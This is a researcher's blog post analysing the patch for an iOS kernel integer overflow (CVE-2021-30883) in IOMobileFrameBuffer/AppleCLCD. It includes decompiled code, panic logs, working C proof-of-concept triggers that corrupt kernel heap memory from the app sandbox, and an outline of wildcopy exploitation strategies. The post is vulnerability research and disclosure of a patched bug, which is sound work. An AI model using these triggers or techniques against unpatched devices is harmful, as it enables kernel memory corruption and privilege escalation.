# Bindiff and POC for the IOMFB vulnerability, iOS 15.0.2

## Intro

In the last iOS security update ([15.0.2](https://support.apple.com/en-us/HT212846)) Apple fixed a vulnerability in *IOMobileFrameBuffer/AppleCLCD*, which they specified was exploited in the wild (CVE-2021-30883). This attack surface is highly interesting because it's accessible from the app sandbox (so it's great for jailbreaks) and many other processes, making it a good candidate for LPEs exploits in chains (WebContent, etc.).

Therefore, I decided to take a quick look, bindiff the patch, and identify the root cause of the bug. After bindiffing and reversing, I saw that the bug is great, and I decided to write this short blogpost, which I hope you'll find helpful. I really want to publish my bindiff findings as close to the patch release as possible, so there will be no full exploit here; However, I did manage to build a really nice and stable POC that results in a great panic at the end :)

## The vulnerability

First thing first, let's view the patched function(s) to understand the bug. Before the patch, there were some different instances of a size calculation without checks for intgerer overflow, in different flows of *new_from_data*. These functions attempt to allocate a buffer that is used to store a table content sent by the user.

Let's take for example *IOMFB::TableCompensator::BilerpGainTable::new_from_data*. Before the patch, the function looks as follows:

```c++
__int64 __fastcall IOMFB::TableCompensator::BilerpGainTable::new_from_data(__int64 a1, __int64 a2, int a3, __int64 *a4, _QWORD *a5, int a6)
{
  __int64 v_obj; // x19
  __int64 v13; // x8
  __int64 v14; // x22
  int v15; // w8
  unsigned int v16; // w23
  __int64 v17; // x0
  __int64 v18; // x8
  __int64 v_idx; // x22

  v_obj = operator new(0x60LL);
  *(_BYTE *)(v_obj + 0x30) = 0;
  *(_QWORD *)v_obj = off_FFFFFFF0078EF1D8;
  *(_QWORD *)(v_obj + 0x58) = 0LL;
  *(_DWORD *)(v_obj + 0x50) = a6;
  *(_DWORD *)(v_obj + 0x54) = 0;
  v13 = *a4;
  *(_QWORD *)(v_obj + 0x38) = 0LL;
  *(_QWORD *)(v_obj + 0x40) = v13;
  *(_QWORD *)(v_obj + 0x48) = *a5;
  *(_DWORD *)(v_obj + 0x10) = a3;
  v14 = *(unsigned int *)(a1 + 0x140);
  *(_DWORD *)(v_obj + 32) = v14;
  if ( a3 )
    v15 = a3;
  else
    v15 = 1;
  v16 = v15 * v14;
  v_chunk = kalloc_ext((unsigned int)(12 * v15 * v14 + 4 * (v14 + a3))); // <-- WOW!
  *(_QWORD *)(v_obj + 40) = v_chunk;
  v18 = v_chunk + 12LL * v16;
  *(_QWORD *)(v_obj + 24) = v18;
  *(_QWORD *)(v_obj + 8) = v18 + 4 * v14;
  if ( a3 )
  {
    v_idx = 0LL;
    while ( IOMFB::TableCompensator::BilerpGainTable::set_table(v_obj, v_idx, a1, a2) & 1 )
    {
      v_idx = (unsigned int)(v_idx + 1);
      if ( (unsigned int)v_idx >= *(_DWORD *)(v_obj + 16) )
        return v_obj;
    }
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v_obj + 8LL))(v_obj);
    v_obj = 0LL;
  }
  return v_obj;
}
```

Every time we see integer calculation, we need to be careful and verify the calculation can't overflow or underflow. In our case, there are no such checks in this function or in the callstack that leads to this function. And, most importantly, most of the operands are fully controlled 32-bit by the caller from EL0. Which means that we have here a classic integer overflow. Oh, and the calculation is done in 32-bit, not 64-bit, which is a nice bonus. This is the actual code:

```
FFFFFFF0098EF290 29 17 9F 1A CSINC           W9, W25, WZR, NE
FFFFFFF0098EF294 09 7D 09 1B MUL             W9, W8, W9
FFFFFFF0098EF298 96 01 80 52 MOV             W22, #0xC
FFFFFFF0098EF29C 29 7D 16 1B MUL             W9, W9, W22
FFFFFFF0098EF2A0 08 01 19 0B ADD             W8, W8, W25
FFFFFFF0098EF2A4 20 09 08 0B ADD             W0, W9, W8,LSL#2
FFFFFFF0098EF2A8 13 83 9D 97 BL              kalloc_ext
```

The patch fixed this issue (promoted to 64 bit arithmetics, upper limits checks, etc.), and along the way, added a NULL-check.

## POC

As always, we can't say that we have a bug until we build a POC and trigger a good panic. We can see that the bug resides in *AppleMobileDispH12P*, which is accessible from *AppleCLCD*. After some reversing and a basic understanding of the flow, we see that this function is accessible from external method 78. This flow is accessible directly from the app sandbox. Unlike the previous in-the-wild vulnerability in IOMFB/AppleCLCD (read [this](https://saaramar.github.io/IOMobileFrameBuffer_LPE_POC/)), **no special entitlements are required**. You can just create an iOS app with my POC, run it on the device and trigger the bug.

Great, let's find a flow to these functions. I chose to target *IOMFB::TableCompensator::BilerpGainTable::new_from_data*. As I said, after some reversing, I saw there is a flow from *IOMobileFramebufferUserClient::s_set_block* (method number 78 of *AppleCLCD*). This function is pretty straightforward: it calls different functions based on the first scalar argument, which may keep processing user input that contains more "actions IDs / selectors" used in some additional switch statements.

I won't bother you with the details, but in order to trigger *IOMFB::TableCompensator::BilerpGainTable::new_from_data* I just needed to set the first and second scalars to 0, and the first 32 bit value in the structureInput to 3. Then, to verify my reversing, I set 0x41s in the rest of the structureInput buffer. By setting a breakpoint on 0xFFFFFFF0098EF290 in the upper code snippet, we can see X5, X8, X20, X22 and X25 are fully controlled 32-bit integers, extracted from the structureInput. Amazing! Here is a dump of the general purpose registers at 0xFFFFFFF0098EF290:

```

       x17 = 0x182effe4cb6d95c0
       x18 = 0x0000000000000000
       x19 = 0xffffffe4cb6d95c0
       x20 = 0x0000000041414141 // <-- controlled
       x21 = 0xffffffe4cd563100
       x22 = 0x0000000041414141 // <-- controlled
       x23 = 0xffffffe4cd5630f4
       x24 = 0xffffffe4cd5630ec
       x25 = 0x0000000041414141 // <-- controlled
       x26 = 0x0000000000000000
       x27 = 0xffffffe818743648
       x28 = 0xffffffe199b91608
       x29 = 0xffffffe8187434b0
       x30 = 0xfffffff0098ef23c
        sp = 0xffffffe818743470
        pc = 0xfffffff0098ef290
      cpsr = 0x20400204
```

And from here, we clearly panic.

So, we have a 32-bit integer overflow in a calculation of size! This size is passed to *kalloc_ext*, which means we can trigger memory corruption, and even control the zone (up to minor restrictions from the calculation). In many cases, such bugs lead to wildcopy, which makes the exploit much more fun for us ([one](https://github.com/saaramar/Publications/blob/master/BluehatIL_2018_WSL_exploit/WSL_slides.pdf), [two](https://saaramar.github.io/str_repeat_exploit/)). Let's dig in and see what's going on in our case.

So, I built the following POC, which triggered a panic on the iOS versions I tried (I tested 14.7.1 and 15.0, but the bug is probably older than that).

POC:

```c
 io_connect_t get_iomfb_uc(void) {
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleCLCD"));
    
    if(service == MACH_PORT_NULL) {
        printf("[-] failed to open service\n");
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD service: 0x%x\n", service);

    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD userclient: 0x%x\n", shared_user_client_conn);
    
    return shared_user_client_conn;
}

void do_trigger(io_connect_t iomfb_uc) {
    kern_return_t ret;
    size_t input_size = 0x180;
    
    uint64_t scalars[2] = { 0 };

    char *input = (char*)malloc(input_size);
    if (input == NULL) {
        perror("malloc input");
        return;
    }
    
    memset(input, 0x41, input_size);
    *(int*)input = 0x3;
    
    ret = IOConnectCallMethod(iomfb_uc, 78,
                        scalars, 2,
                        input, input_size,
                        NULL, NULL,
                        NULL, NULL);
    
    if (ret != KERN_SUCCESS) {
        printf("s_set_block failed, ret == 0x%x --> %s\n", ret, mach_error_string(ret));
    } else {
        printf("success!\n");
    }
    
    free(input);
}



void poc(void) {
    io_connect_t iomfb_uc = get_iomfb_uc();
    if (iomfb_uc == MACH_PORT_NULL) {
       return;
    }
    
    do_trigger(iomfb_uc);
    
    IOServiceClose(iomfb_uc);
}
```

And, the panic (from my physical iPhone X, iOS 14.7.1, 18G82):

...
Kernel slide:      0x000000000ece0000
Kernel text base:  0xfffffff015ce4000
```

And, if we'll look at *0xfffffff0172c4244-0x000000000ece0000* in the kernelcache of my physical device:

```
com.apple.driver.AppleMobileDispH10P:__text:FFFFFFF0085E4244                 STR             W3, [X9,W1,UXTW#2]
```

Ok, that's interesting. We got a panic because we tried to write our controlled value (0x41414141) to the virtual address 0x0000000388b5e310 (which clearly isn't a valid kernel address). Actually, this value makes me suspect it results from an allocation failure: *kalloc_ext* returned NULL (note there is no check for that in the code), and the *new_from_data* function just added an offset to the newly allocated chunk (which, again, is 0x0). Let's see this happens:

The faulted instruction is in the function *IOMFB::TableCompensator::BilerpGainTable::set_table*, which, as we saw in the first code snippet, is called from *IOMFB::TableCompensator::BilerpGainTable::new_from_data*. Let's see what *set_table* does:

```c++
__int64 __fastcall IOMFB::TableCompensator::BilerpGainTable::set_table(__int64 obj, unsigned int idx, __int64 a3, int a4)
{
  int v4; // w10
  __int64 v5; // x9
  __int64 v6; // x8
  __int64 v7; // x11
  unsigned __int64 v9; // x9
  _DWORD *v10; // x10
  _DWORD *v11; // x11

  if ( *(_DWORD *)(obj + 0x10) <= idx )
    return 0LL;
  v4 = *(_DWORD *)(obj + 0x20);
  if ( *(_DWORD *)(a3 + 0x140) != v4 )
    return 0LL;
  v5 = *(_QWORD *)(obj + 8);
  v6 = *(_QWORD *)(obj + 0x18);
  v7 = *(_QWORD *)(obj + 0x28);
  if ( idx )
  {
    if ( *(_DWORD *)(v5 + 4LL * (idx - 1)) > a4 )
      return 0LL;
  }
  *(_DWORD *)(v5 + 4LL * idx) = a4;             // panic here
  if ( *(_DWORD *)(obj + 32) )
  {
    v9 = 0LL;
    v10 = (_DWORD *)(v7 + 12LL * v4 * idx);
    v11 = (_DWORD *)(a3 + 8);
    do
    {
      *(_DWORD *)(v6 + 4 * v9) = *(v11 - 2);
...
```

Now, the address being dereferenced is *(X0+8), which is, as we saw before, the allocation with an offset (keep in mind, the operands here are controlled, and in the case of my POC, are huge):

```c++
v_chunk = kalloc_ext((unsigned int)(12 * v15 * v14 + 4 * (v14 + a3)));
  *(_QWORD *)(v_obj + 40) = v_chunk;
  v18 = v_chunk + 12LL * v16;
  *(_QWORD *)(v_obj + 24) = v18;
  *(_QWORD *)(v_obj + 8) = v18 + 4 * v14;
```

And the actual code:

```

And, at 0xFFFFFFF0098EF2AC (where X0 is the return value of *kalloc_ext*):

```

    frame #0: 0xfffffff0098ef2ac

Target 0: (No executable module.) stopped.
(lldb) reg read x0
      x0 = 0x0000000000000000
```

Fantastic! This explains everything. Just as I suspected, the previous dereference was actually a NULL+offset, due to an allocation failure. So, for exploitation, we simply need to choose different operands that will overflow to a relatively smaller number. This would make the allocation succeed, and we could start corrupting (a lot of) memory.

The POC works on iOS 15.0 with the exact same panic as well (tested on a virtual iPhone 11 Pro, iOS 15.0):

![image](https://github.com/saaramar/IOMFB_integer_overflow_poc/raw/main/docs/assets/corellium_11_pro.png)

An interesting important note is that other implementations of these functions in other classes also had this integer overflow. As far as I can see, the patch fixed these as well. This is not a surprise, because usually when we see a code pattern repeats itself, it's an inline function / macro / etc.

## Exploitation

I just bindiffed the bug, so there will be no full exploit in this blogpost; However, we can still discuss the exploitation of wildcopies in general and improve the POC to set the ground for exploitation :) But before we start talking about wildcopies, let me just share some POCs that give us better control on the flow and trigger a good panic.

### Control the operands

First, let set arbitrary values in the offsets the operands are taken from (instead of setting 0x41s in the entire input). Nothing exciting here; it's just reversing of the caller function of *IOMFB::TableCompensator::BilerpGainTable::new_from_data*. The updated part in the POC:

```c++
...
    memset(input, 0x0, input_size);
    int *pArr = (int*)input;

    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x41414141;
    pArr[3] = 0x42424242;
    pArr[8] = 0x43434343;
    pArr[89] = 0x44444444;
    
    ret = IOConnectCallMethod(iomfb_uc, 78,
                        scalars, 2,
                        input, input_size,
                        NULL, NULL,
                        NULL, NULL);
...
```

Which gives the following registers (for the same stub as above, virtual iPhone 11 Pro, iOS 14.7.1):

### Better panic, i.e. - NOT a (NULL+offset) dereference

Now, first thing I would like to do is to get a better panic: i.e a panic that indicates we can corrupt memory in a good way (well, for us). Bad dereference of NULL+offset (with small and limited offset) is just a DOS, which isn't good enough for us (it's not a security issue). So, if we'll just adjust my POC to look as follows:

```c
    memset(input, 0x41, input_size);
    int *pArr = (int*)input;

    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x10008;
    pArr[3] = 0x424242;
    pArr[8] = 0x434343;
    pArr[89] = 0x444444;
```

We got a better panic (again, my physical iPhone X, iOS 14.7.1, 18G82):

```

...

```

Much better. Note that PC is the same as before (0xfffffff02795c244-0x000000001f378000==0xFFFFFFF0085E4244), but this time the dst base address is X9=0xffffffec5276aa90. We still crash on the first index of the loop (X1=0), becasue the offset was too large. That's because we didn't choose the other arbitrary values wisely. Let's fix that.

### Better panic - a POC of a classic wildcopy

So everything is great, and we understand exactly what's going on. But that's still not enough. We need to get a good panic that indicates we corrupted arbitrary memory (which we could control via shaping, etc.). Panic on a write to an unmapped page is a good first step, but there is more work to do. Because it looks like we are going here into a wildcopy situation, let's choose good arguments such that:

- we get a "sane" allocation size (although it may still be pretty high)
- we get a sane offset from the allocation 
- we start corrupt memory and crash on an unmapped page after a while (i.e., we successfully corrupted some memory before the panic)

This might be a good POC for the wildcopy. And then, we just need to figure out how to stop the wildcopy and exploit the corruption (see next section).

So, in this new POC, the allocation size is still very large, but the allocation does succeed:

```c
    memset(input, 0x41, input_size);
    int *pArr = (int*)input;

    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x10008;
    pArr[3] = 0x424242;
    pArr[8] = 0x434343;
    pArr[89] = 0x10008;
```

And the panic:

```
  "build" : "iPhone OS 14.7.1 (18G82)",
  "product" : "iPhone10,3",
...
  "panicString" : "panic(cpu 5 caller 0xfffffff02585b2d4): Kernel data abort. at pc 0xfffffff025d3c270, lr 0xfffffff025d3c1b8 (saved state: 0xffffffe816513110)

```

Oh, new instruction! Actually, not that far from the one in our last panic. We crash in a loop (in *IOMFB::TableCompensator::BilerpGainTable::set_table*). The address is 0xfffffff025d3c270-0x000000001d758000=0xfffffff0085e4270. The loop is as follows (from iPhone X, iOS 14.7.1):

```
FFFFFFF0085E4264
FFFFFFF0085E4264 loop
FFFFFFF0085E4264 LDUR            W12, [X11,#-8]
FFFFFFF0085E4268 STR             W12, [X8,X9,LSL#2]
FFFFFFF0085E426C LDUR            W12, [X11,#-4]
FFFFFFF0085E4270 STR             W12, [X10]           <-- panic here
FFFFFFF0085E4274 LDR             W12, [X11]
FFFFFFF0085E4278 STR             W12, [X10,#4]
FFFFFFF0085E427C LDR             W12, [X11,#4]
FFFFFFF0085E4280 STR             W12, [X10,#8]
FFFFFFF0085E4284 ADD             X9, X9, #1           <-- inc index
FFFFFFF0085E4288 LDR             W12, [X0,#0x20]
FFFFFFF0085E428C ADD             X11, X11, #0x10
FFFFFFF0085E4290 ADD             X10, X10, #0xC
FFFFFFF0085E4294 CMP             X9, X12              <-- cmp index to cnt
FFFFFFF0085E4298 B.CC            loop
```

And we can see two important points about this crash:

* X9 (the counter in the loop) is 0xaf90 (and this loop was called a lot of times before).
* X10, the address being dereferenced, is paged aligned - 0xffffffe9047a4000. Which means we reached to a non-mapped area.

This is pretty much what I would expect from a classic wildcopy crash (without proper shape && exploit, of course :) ).

### Wildcopy exploitation

Now, let's get to the interesting part: stopping the wildcopy. As I said in my previous exploits, there are different approaches we can take here. Let's view some examples:

1. Relying on a race condition – shape the heap and trigger the wildcopy so it will corrupt some useful target structure(s), and race a different thread to use that corrupted structure to do something before the wildcopy crashes us (e.g., construct other primitives, terminate the wildcopy, etc.). A nice example could be found [here](https://saaramar.github.io/str_repeat_exploit/).
2. If the wildcopy loop/mechaism has some logic that can stop the loop under certain conditions, we can take advantage of these checks and break the wildcopy after it corrupted the data/structure we want to corrupt. This is exactly the approach I took in my [WSL exploit](https://github.com/saaramar/Publications/blob/master/BluehatIL_2018_WSL_exploit/WSL_slides.pdf). This technique could be achieved using many different approaches, such as:
   * If there is a double fetch from a memory that shouldn't change, or that could be changed, but there are checks in place (so there is no security issue due to the existence of the double fetch, but the logic indeed double fetch), we can take advantage of this double fetch and break the loop. Keep in mind that we do not care if the functionality will result in an error, as long this happens after we corrupted our desired target structure.
3. If the wildcopy loop has a call to a virtual function on every iteration, and that function pointer is stored in a structure on the heap (or at other memory address we can corrupt during the wildcopy), the exploit can use the loop to overwrite and divert execution during the wildcopy.

In our particular case, I saw some checks based on values the logic reads from memory (for instance, check out the branch right before the first panic we got in *IOMFB::TableCompensator::BilerpGainTable::set_table*). Keep in mind that as long as *set_table* returns value != 0, the loop in *new_from_data* keeps running (i.e. the wildcopy keeps running). You can take a look again at the decompile code at the beginning of this blogpost. So any branch that returns 0 from *set_table* is good for us to stop the wildcopy. Keep this in mind for later; that's important!

Another important point: some of the values that *set_table* fetches from memory would be OOB: remember, we allocated a very small chunk of memory (the size just wrapped around 32 bit), and we treat it as >4GB.

So, what I would like to do, is to change one of the checked values at some point (after some data has been corrupted, of course) and stop the copying. There are many ways to do that, but I think one of the simplest ways is to shape the kernel heap such that the vulnerable chunk will be allocated before a shared memory, which we could change from EL0 at arbitrary times. Again, the patch just got out, so I clearly didn't test it out yet, but just an idea I found very useful in many similar cases.

### Great panic!

So, as I said, we should build a good shape and use the conditional branches I mentioned to stop the wildcopy. These branches use values read from OOB, and we can shape the heap so we'll read these values from a shared memory / controlled memory / etc. For concrete example, check out the WSL exploit I linked above.

The problem is that I want to publish this blogpost as close to the patch release as possible, so I won't do that right now. Instead, I came up with a nice idea that happens to work **VERY WELL** (surprisingly). I tested it 5 times in a row on my physical device (iPhone X, iOS 14.7.1) and on the virtual device (iPhone 11 Pro, iOS 15.0), and it worked every time, the same way, on both devices. So, given it had a 100% success rate, and I always got the same panic I wanted, I'll share it here as well :)

Before diving into the idea, let's just keep in mind that *new_from_data* calls *set_table* in a loop, and if one of the calls to *set_table* returned 0, we bail out. In addition, *set_table* does some conditional branches at the beginning and only then starts the copying loop. And, if one of these conditional branches isn't passed, set_table returns 0. If they all pass, the copying loop starts. You can clearly see that in the decompiled code at the beginning of this blogpost.

Therefore, the idea is simple: let's choose numbers that give us the following properties:

1. make the overflowed calculation to result in a small and common size (I picked 0x44)
2. make the wildcopy to be built out of **many loops, each copy a small number of bytes instead of a small number of loops, each copy a large number of bytes**. This **significantly increases** the number of checks that could get us out of the wildcopy, and we could just hope that the random content from the heap will break us out of the copy (again, proper shaping will do this in the right way, but the patch got out 2 hours ago. So, let's test it out :P).

As it turns out, this approach works "too well", in the sense that in most cases, we get out of the coping loop way too early (i.e. we wrote a very little amount of bytes OOB the allocation), and, in a few cases, we get out of the function and stop before the corruption even starts (and then, nothing crashes). But after I ran my POC app a few times in a row, I got the good panic I aimed for! So, I just wrapped it up in a loop, and the good panic I aimed for happens all the time!

I also set a breakpoint in the "return 0" in *set_table*, and I see this happens. You can also use the debugger to see how many bytes have been corrupted exactly in each call to *s_set_block*.

Now, to the POC! By reversing and debugging, it's easy to see that pArr[89] is the number of iterations of the copying loop in *IOMFB::TableCompensator::BilerpGainTable::set_table*. So, I chose numbers that give me this property of lots of iterations in *new_from_data*, each calls a small loop in *set_table*, and that the integer overflow results in 0x44. By changing the relevant part in the POC:

```c
    // we control the content we are corrupting with
    memset(input, 0x41, input_size);
    int *pArr = (int*)input;

    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x40000001;   // #iterations in the outer loop (new_from_data)
    pArr[3] = 2;
    pArr[8] = 2;
    pArr[89] = 4;           // #iterations in the inner loop (set_table)
    
    /* each call trigger a flow with a lot of calls to set_table(), while
       each set_table() flow will do a loop of only 4 iterations*/
    for (size_t i = 0; i < 0x10000; ++i) {
        ret = IOConnectCallMethod(iomfb_uc, 78,
                            scalars, 2,
                            input, input_size,
                            NULL, NULL,
                            NULL, NULL);
    }
```

And, the panic I'm always getting, on physical device iPhone X, 14.7.1 (it behaves **exactly** the same on virtual iPhone 11 Pro 14.7.1/15.0):

```
  "build" : "iPhone OS 14.7.1 (18G82)",
  "product" : "iPhone10,3",
...
  "panicString" : "panic(cpu 5 caller 0xfffffff01ad1d050): [kext.kalloc.80]: element modified after free (off:0, val:0x4141414141414141, sz:80, ptr:0xffffffe4cb9780f0, prot:zero)
    0: 0x4141414141414141
    8: 0x4141414141414141
...
Kernel slide:      0x0000000012c1c000
Kernel text base:  0xfffffff019c20000
```

Yes! Fantastic! The very same panic happens on the virtual iPhone 11 Pro, 15.0, 19A344:

```
panic(cpu 4 caller 0xfffffff0083441dc): [default.kalloc.80]: element modified after free (off:0, val:0x4141414141414141, sz:80, ptr:0xffffffe379503430)

    8: 0x4141414141414141
Debugger message: panic

Hardware Model: iPhone12,3
```

I have to admit, seeing this trick works so well made me very happy :)

## Sum up

I hope you enjoyed reading this blogpost and that I managed to shed some light on the last iOS update.

Also, as you saw, [Corellium](https://twitter.com/corelliumhq) was a highly valuable asset in this short journey. The ability to debug the kernel that easily is fantastic, and it saved me a lot of time. And, the behavior on the virtual device, of course, reproduced exactly the same on the physical device, with 0 changes.

### materials && versions

The POCs I have shown here work all the same on iOS 14.7.1-15.0.1. It's probably true for much earlier versions as well, but I checked only on 14.7.1-15.0.1. Please note that over different devices/versions, some of the constants may be different. I specifically wrote the devices/versions I tested on, and it looks consistent, but it may be different on older versions. Just for fun, I checked it also on iPhone 11 Pro Max, iOS 15.0, and it worked the same :)

The code of the POC can be found in this [repo](https://github.com/saaramar/IOMFB_integer_overflow_poc).

Thanks,

Saar Amar.
